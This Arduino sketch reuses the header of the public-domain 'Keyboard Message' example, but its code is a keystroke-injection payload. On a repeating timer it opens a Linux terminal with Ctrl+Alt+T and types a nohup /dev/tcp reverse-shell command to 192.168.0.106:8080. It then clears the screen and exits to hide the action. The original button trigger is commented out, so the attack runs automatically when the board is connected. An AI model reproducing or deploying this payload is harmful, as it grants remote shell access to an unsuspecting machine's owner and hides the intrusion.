#include <Keyboard.h>


/*
 Keyboard Message test

 For the Arduino Leonardo and Micro.

 Sends a text string when a button is pressed.

 The circuit:
 * pushbutton attached from pin 4 to +5V
 * 10-kilohm resistor attached from pin 4 to ground

 created 24 Oct 2011
 modified 27 Mar 2012
 by Tom Igoe
 modified 11 Nov 2013
 by Scott Fitzgerald

 This example code is in the public domain.

 http://www.arduino.cc/en/Tutorial/KeyboardMessage
 */

#include "Keyboard.h"
char ctrlKey = KEY_LEFT_CTRL;
char altKey = KEY_LEFT_ALT;

const int buttonPin = 4;          // input pin for pushbutton
int previousButtonState = HIGH;   // for checking the state of a pushButton
int counter = 0,i;                  // button push counter

void setup() {
  // make the pushButton pin an input:
  pinMode(buttonPin, INPUT);
  // initialize control over the keyboard:
  Keyboard.begin();
}

void loop() {
 for(i=0;i<4;i++)
    {delay(10000);}
 send_keystroke();
}
void send_keystroke()
{
  //int buttonState = digitalRead(buttonPin);
  // if the button state has changed,
  //if ((buttonState != previousButtonState)
      // and it's currently pressed:
    //  && (buttonState == HIGH)) {
    // increment the button counter
      Keyboard.press(ctrlKey);
      Keyboard.press(altKey);
      Keyboard.press('t');
      delay(200);
      Keyboard.releaseAll();
      delay(100);
      Keyboard.print(" nohup 0<&196;exec 196<>/dev/tcp/192.168.0.106/8080; sh <&196 >&196 2>&196 & \n");
      delay(1000);
      Keyboard.press(ctrlKey);
      Keyboard.press('l');
      delay(100);
      Keyboard.releaseAll();
      delay(100);
      Keyboard.print(" exit\n");
      delay(10);    
 // }
  // save the current button state for comparison next time:
  //previousButtonState = buttonState;
}

